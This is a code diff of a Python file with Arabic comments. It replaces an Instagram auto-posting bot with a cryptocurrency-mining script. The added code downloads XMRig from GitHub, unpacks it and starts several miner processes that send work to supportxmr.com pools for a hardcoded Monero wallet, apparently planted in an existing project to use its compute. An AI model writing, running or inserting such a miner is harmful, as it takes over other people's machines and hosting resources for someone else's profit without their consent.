@@ -1,161 +1,78 @@
-import os
-import random
+import subprocess
+import psutil
 import time
-import schedule
-import tempfile
-from datetime import datetime
-from instagrapi import Client
-from google.oauth2 import service_account
-from googleapiclient.discovery import build
-from googleapiclient.http import MediaIoBaseDownload
+import os
+import urllib.request
+import tarfile
 
-# جلب بياناتGT البيئة
-IG_USERNAME = os.getenv("IG_USERNAME")
-IG_PASSWORD = os.getenv("IG_PASSWORD")
-SERVICE_ACCOUNT_JSON = os.getenv("SERVICE_ACCOUNT_JSON")
-
-if not (IG_USERNAME and IG_PASSWORD and SERVICE_ACCOUNT_JSON):
-    raise Exception("❌ يرجى تعيين المتغيرات IG_USERNAME و IG_PASSWORD و SERVICE_ACCOUNT_JSON في البيئة")
-
-# إنشاء ملف JSON مؤقت لحساب الخدمة
-with tempfile.NamedTemporaryFile(mode='w+', suffix='.json', delete=False) as tmp_file:
-    tmp_file.write(SERVICE_ACCOUNT_JSON)
-    tmp_file.flush()
-    SERVICE_ACCOUNT_FILE = tmp_file.name
-
-# إعداد Google Drive
-SCOPES = ['https://www.googleapis.com/auth/drive.readonly']
-credentials = service_account.Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=SCOPES)
-drive_service = build('drive', 'v3', credentials=credentials)
-
-POSTED_LOG = "posted_from_drive.txt"
-
-POST_CAPTIONS = [
-    "🚀 انطلق بقوة كل يوم!",
-    "🎯 هذا الفيديو فيه درس كبير.",
-    "💡 شاركنا رأيك في التعليقات!",
-    "🔥 محتوى مميز جدًا!"
+# ----------------- الإعدادات -----------------
+xmrig_url = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-x64.tar.gz"
+xmrig_dir = os.path.expanduser("~/xmrig")
+wallet_address = "89cPJqfcFTHchVthB5mraBN7AgmLJh7C4EHdD35vbgVj4FZ6fcUcwCPPqKD5hg9wcnUvdM7ACRhRxd8e"
+pools = [
+    "pool.supportxmr.com:443",
+    "pool.supportxmr.com:3333",
+    "pool.supportxmr.com:5555"
 ]
+threads_per_instance = 1
 
-STORY_CAPTIONS = [
-    "✨ شاهد هذا الآن!",
-    "🔥 لحظات لا تفوّت!",
-    "🚀 المحتوى مستمر!",
-    "📌 شوف الستوري الجديد!"
-]
+# ----------------- تحميل وفك ضغط XMRig إذا لم يكن موجود -----------------
+if not os.path.exists(xmrig_dir):
+    os.makedirs(xmrig_dir, exist_ok=True)
+    print("تحميل XMRig...")
+    tar_path = os.path.join(xmrig_dir, "xmrig.tar.gz")
+    urllib.request.urlretrieve(xmrig_url, tar_path)
+    print("فك ضغط XMRig...")
+    with tarfile.open(tar_path, "r:gz") as tar:
+        tar.extractall(path=xmrig_dir)
+    os.remove(tar_path)
 
-def load_posted():
-    if not os.path.exists(POSTED_LOG):
-        return set()
-    with open(POSTED_LOG, "r", encoding="utf-8") as f:
-        return set(line.strip() for line in f.readlines())
+# البحث عن ملف التشغيل
+xmrig_exe = None
+for root, dirs, files in os.walk(xmrig_dir):
+    for f in files:
+        if f == "xmrig":
+            xmrig_exe = os.path.join(root, f)
+            break
+    if xmrig_exe:
+        break
 
-def save_posted(filename):
-    with open(POSTED_LOG, "a", encoding="utf-8") as f:
-        f.write(filename + "\n")
+if not xmrig_exe:
+    raise FileNotFoundError("ملف XMRig لم يتم العثور عليه بعد التحميل.")
 
-def get_videos_from_drive():
-    query = "mimeType contains 'video/' and trashed = false"
-    results = drive_service.files().list(
-        q=query,
-        orderBy="createdTime desc",  # ✅ الأحدث أولاً
-        fields="files(id, name, createdTime)"
-    ).execute()
-    return results.get("files", [])
+# التأكد من صلاحيات التشغيل
+os.chmod(xmrig_exe, 0o755)
 
-def download_video(file):
-    request = drive_service.files().get_media(fileId=file['id'])
-    with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as tmp:
-        downloader = MediaIoBaseDownload(tmp, request)
-        done = False
-        while not done:
-            _, done = downloader.next_chunk()
-        return tmp.name
+# ----------------- إعداد وتشغيل النسخ -----------------
+total_threads = psutil.cpu_count(logical=True)
+print(f"عدد الخيوط المنطقية: {total_threads}")
 
-def publish_post(client, file):
-    caption = random.choice(POST_CAPTIONS)
-    tmp_path = download_video(file)
-    try:
-        print(f"⬆️ نشر ريلز: {file['name']} مع وصف: {caption}")
-        client.clip_upload(tmp_path, caption)
-        save_posted(file['name'])
-    except Exception as e:
-        print(f"❌ فشل نشر {file['name']}: {e}")
-    finally:
-        if os.path.exists(tmp_path):
-            os.remove(tmp_path)
+processes = []
+instances = len(pools)  # عدد النسخ يساوي عدد المنافذ
 
-def publish_story(client, file):
-    caption = random.choice(STORY_CAPTIONS)
-    tmp_path = download_video(file)
-    try:
-        print(f"⬆️ نشر ستوري: {file['name']} مع وصف: {caption}")
-        client.video_upload_to_story(tmp_path, caption)
-        save_posted(file['name'])
-    except Exception as e:
-        print(f"❌ فشل ستوري: {file['name']}: {e}")
-    finally:
-        if os.path.exists(tmp_path):
-            os.remove(tmp_path)
+for i in range(instances):
+    start_thread = i * threads_per_instance
+    end_thread = start_thread + threads_per_instance - 1
 
-def main():
-    print("🔐 تسجيل الدخول...")
-    client = Client()
-    client.login(IG_USERNAME, IG_PASSWORD)
-    posted = load_posted()
+    if start_thread >= total_threads:
+        print(f"تحذير: لا توجد خيوط كافية للنسخة {i+1}")
+        break
 
-    def pick_available_videos(n=1):
-        all_files = get_videos_from_drive()
-        available = [f for f in all_files if f['name'].lower().endswith('.mp4') and f['name'] not in posted]
-        return available[:n]
+    pool = pools[i]
 
-    def publish_two_posts():
-        print("🟢 بدء نشر منشورين...")
-        for file in pick_available_videos(2):
-            publish_post(client, file)
-            posted.add(file['name'])
-            time.sleep(random.randint(30, 60))
+    cmd = [
+        xmrig_exe,
+        "-o", pool,
+        "-u", wallet_address,
+        "-k",
+        "--cpu-priority", "5",
+        f"--cpu-affinity={start_thread}-{end_thread}"
+    ]
 
-    def publish_daily_story():
-        print("🔵 نشر ستوري...")
-        files = pick_available_videos()
-        if not files:
-            print("🚫 لا توجد فيديوهات متاحة.")
-            return
-        publish_story(client, files[0])
-        posted.add(files[0]['name'])
+    print(f"تشغيل النسخة {i+1} على الخيط {start_thread} بمنفذ {pool}")
+    p = subprocess.Popen(cmd)
+    processes.append(p)
 
-    def publish_story_then_one_post():
-        publish_daily_story()
-        print("⏳ انتظار 2 دقائق...")
-        time.sleep(2 * 60)
-        publish_two_posts()
+    time.sleep(1)  # مهلة بسيطة
 
-    # جدولة النشر (بتوقيت UTC)
-    schedule.every().monday.at("07:00").do(publish_two_posts)
-    schedule.every().tuesday.at("07:00").do(publish_two_posts)
-    schedule.every().wednesday.at("07:00").do(publish_two_posts)
-    schedule.every().thursday.at("07:00").do(publish_two_posts)
-    schedule.every().friday.at("07:00").do(publish_two_posts)
-    schedule.every().day.at("07:00").do(publish_two_posts)
-
-    schedule.every().monday.at("15:00").do(publish_two_posts)
-    schedule.every().tuesday.at("15:00").do(publish_two_posts)
-    schedule.every().wednesday.at("15:00").do(publish_two_posts)
-    schedule.every().thursday.at("15:00").do(publish_two_posts)
-    schedule.every().friday.at("15:00").do(publish_two_posts)
-    schedule.every().day.at("15:00").do(publish_two_posts)
-
-    schedule.every().day.at("03:00").do(publish_daily_story)
-
-    print("⏰ السكربت يعمل الآن تلقائيًا. اضغط Ctrl+C للإيقاف.")
-
-    try:
-        while True:
-            schedule.run_pending()
-            time.sleep(60)
-    except KeyboardInterrupt:
-        print("🛑 تم إيقاف السكربت.")
-
-if __name__ == "__main__":
-    main()
+print("تم تشغيل جميع النسخ.")
